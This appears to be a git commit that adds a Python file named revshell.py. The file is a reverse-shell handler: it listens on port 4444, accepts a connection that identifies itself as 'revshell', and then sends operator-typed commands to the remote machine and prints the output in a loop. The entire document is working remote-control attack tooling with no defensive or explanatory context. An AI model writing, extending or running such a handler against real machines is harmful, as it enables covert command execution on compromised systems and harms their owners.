69ed5480a4c05ac0b83c05134636825d339a42a6
noahehrnstrom <noah.ehrnstrom@gmail.com>
2021-07-02 15:16:19 +0200

    Create revshell.py

---
+++ src/client/revshell.py
@@ -0,0 +1,49 @@
+import socket
+import threading
+import os
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+def receive(client):
+    out = ""
+    recvlen = 1
+    while recvlen > 0:
+        data = client.recv(4096)
+        recvlen = len(data)
+        out += data.decode()
+
+        if (recvlen < 4096):
+            break
+
+    print(out)
+
+sock.bind(("0.0.0.0", 4444))
+
+sock.listen(5)
+
+client, addr = sock.accept()
+
+out = client.recv(1024).decode()
+
+if (out != "revshell"):
+    print("[!] Incoming protocol is not a reverse shell. Exiting.")
+    exit(0)
+
+print("[*] Recieved reverse shell from {}:{}".format(addr[0], addr[1]))
+
+while True:
+    cmd = input("CMD> ")
+    request = cmd + ("0" * (1024 - len(cmd)))
+
+    if (cmd == "shut"):
+        client.send(request.encode())
+        print("[*] Closing remote socket...")
+        exit(0)
+    elif (cmd == "clear"):
+        os.system("clear")
+    else:
+        client.send(request.encode())
+        t = threading.Thread(target=receive, args=(client,))
+        t.start()
+
+
